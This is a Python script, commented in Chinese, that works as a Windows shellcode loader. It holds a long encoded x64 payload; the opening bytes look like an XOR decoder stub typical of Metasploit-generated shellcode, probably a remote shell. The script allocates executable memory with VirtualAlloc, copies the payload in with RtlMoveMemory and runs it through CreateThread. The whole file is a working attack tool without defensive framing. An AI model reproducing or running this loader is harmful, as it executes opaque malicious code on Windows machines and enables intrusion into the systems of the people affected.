# -*- coding: UTF-8 -*-
import ctypes

# shellcode内容
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x9b\x12\xc5\xf0\x6b\xfb\xaa"
buf += b"\x9a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x67\x5a\x46\x14\x9b\x13\x66\x9a\x9b\x12\x84\xa1\x2a"
buf += b"\xab\xf8\xcb\xcd\x5a\xf4\x22\x0e\xb3\x21\xc8\xfb\x5a"
buf += b"\x4e\xa2\x73\xb3\x21\xc8\xbb\x5a\xca\x47\x21\xb1\xe7"
buf += b"\xab\x52\x5a\x4e\x82\x3b\xb3\x9b\x5a\x37\x2e\xa4\x8c"
buf += b"\x69\xd7\x8a\xdb\x5a\xdb\xc8\xb1\x6a\x3a\x48\x77\xc9"
buf += b"\x5a\x4e\xa2\x4b\x70\xe8\xa6\xda\x43\x8d\xf1\xbb\x9d"
buf += b"\x2b\xe2\x83\x19\xc7\xff\xee\x89\xaa\x9a\x9b\x99\x45"                                                                                                                                                                             
buf += b"\x78\x6b\xfb\xaa\xd2\x1e\xd2\xb1\x97\x23\xfa\x7a\xca"                                                                                                                                                                             
buf += b"\xdf\x99\x85\xd0\xe0\xb3\xb2\xd3\x9a\xc2\x26\xa6\x23"                                                                                                                                                                             
buf += b"\x04\x63\xd7\xaa\xdb\x84\x7b\x5f\x73\xe2\x9b\x4d\x5a"                                                                                                                                                                             
buf += b"\xf4\x30\x2a\x3a\x63\x97\x37\x53\xc4\x31\x53\x1b\xdf"                                                                                                                                                                             
buf += b"\x6b\xd7\x11\x89\xd4\x63\xbe\x93\x4b\xee\xca\x9d\xb4"                                                                                                                                                                             
buf += b"\xe0\xbb\x8e\xd3\x9a\xc2\xa3\xb1\xe0\xf7\xe2\xde\x10"                                                                                                                                                                             
buf += b"\x52\xd9\xb9\x6a\x2b\xeb\x11\x9f\x9a\x8d\xf1\xbb\xba"                                                                                                                                                                             
buf += b"\xf2\xdb\xc3\x4c\x9c\xaa\x2a\xa3\xeb\xc3\xda\x48\x8d"                                                                                                                                                                             
buf += b"\x73\x87\xdb\xeb\xc8\x64\xf2\x9d\xb1\x32\xa1\xe2\x11"                                                                                                                                                                             
buf += b"\x89\xfb\x8e\x0f\x94\x04\xf7\xd3\x25\x65\xb6\xc2\x34"                                                                                                                                                                                                                                                              
buf += b"\xc8\x98\x9a\x9b\x53\x93\xb9\xe2\x1d\xe2\x1b\x77\xb2"                                                                                                                                                                                                                                                              
buf += b"\xc4\xf0\x6b\xb2\x23\x7f\xd2\xae\xc7\xf0\x74\x6b\x6a"                                                                                                                                                                                                                                                              
buf += b"\x32\x99\x92\x84\xa4\x22\x72\x4e\xd6\x12\xe3\x84\x4a"                                                                                                                                                                                                                                                              
buf += b"\x27\x8c\x8c\x9d\x64\xc7\x89\x79\x81\x93\xab\x9b\x9b"                                                                                                                                                                                                                                                              
buf += b"\x12\x9c\xb1\xd1\xd2\x2a\xf1\x9b\xed\x10\x9a\x61\xba"                                                                                                                                                                                                                                                              
buf += b"\xf4\xca\xcb\x5f\xf4\x39\x26\xca\x6a\xd2\x64\xd2\x8d"                                                                                                                                                                                                                                                              
buf += b"\x79\xa9\xb3\x55\x5a\xd3\x9b\x04\xb1\xd1\x11\xa5\x45"                                                                                                                                                                                                                                                              
buf += b"\x7b\xed\x10\xb8\xe2\x3c\xc0\x8a\xda\x4a\x89\x79\x89"                                                                                                                                                                                                                                                              
buf += b"\xb3\x23\x63\xda\xa8\x5c\x55\x1f\x9a\x55\x4f\x1e\xd2"                                                                                                                                                                                                                                                              
buf += b"\xb1\xfa\x22\x04\x64\xef\x7e\xfa\x56\xf0\x6b\xfb\xe2"                                                                                                                                                                                                                                                              
buf += b"\x19\x77\x02\x8d\x79\x89\xb6\x9b\x53\xf1\x16\x84\xa8"                                                                                                                                                                                                                                                              
buf += b"\x23\x72\x53\xdb\x21\x10\x1c\x38\x34\x04\x7f\x19\x63"                                                                                                                                                                                                                                                              
buf += b"\x12\xbb\xa5\x23\x78\x6e\xba\xc5\x9b\x33\x9a\x2b\xba"                                                                                                                                                                                                                                                              
buf += b"\xf3\xf2\x9b\x02\xc5\xf0\x2a\xa3\xe2\x13\x69\x5a\xf4"                                                                                                                                                                                                                                                              
buf += b"\x39\x2a\x41\xf2\x3e\xc8\xf7\x3a\x25\x23\x72\x69\xd3"                                                                                                                                                                                                                                                              
buf += b"\x12\xd5\x88\xc1\xa2\xb2\x23\x6a\xd3\x9b\x1f\xb8\xe2"                                                                                                                                                                                                                                                              
buf += b"\x02\xeb\x20\x99\xcb\x0d\xaf\x94\x2e\x29\x62\x9b\x6f"                                                                                                                                                                                                                                                              
buf += b"\xed\xa8\x2a\xac\xf3\xf2\x9b\x52\xc5\xf0\x2a\xa3\xc0"                                                                                                                                                                                                                                                              
buf += b"\x9a\xc1\x53\x7f\xfb\x44\xf4\x9a\x65\x4e\x45\x9c\xb1"                                                                                                                                                                                                                                                              
buf += b"\xd1\x8e\xc4\xd7\xfa\xed\x10\xb9\x94\x35\x43\xa6\x64"
buf += b"\xed\x3a\xb8\x6a\x38\xe2\xb3\x5d\x5a\x40\x06\x1e\x4f"
buf += b"\xeb\x65\x7c\x4a\xaf\xf0\x32\xb2\x6d\x58\x6b\xa7\x67"
buf += b"\xa6\x94\x2e\xaa\x9a"

shellcode= bytearray(buf)

#设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64
#申请内存
ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
#放入shellcode
buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
#创建一个线程从shellcode放置位置首地址开始执行
handle= ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
#等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
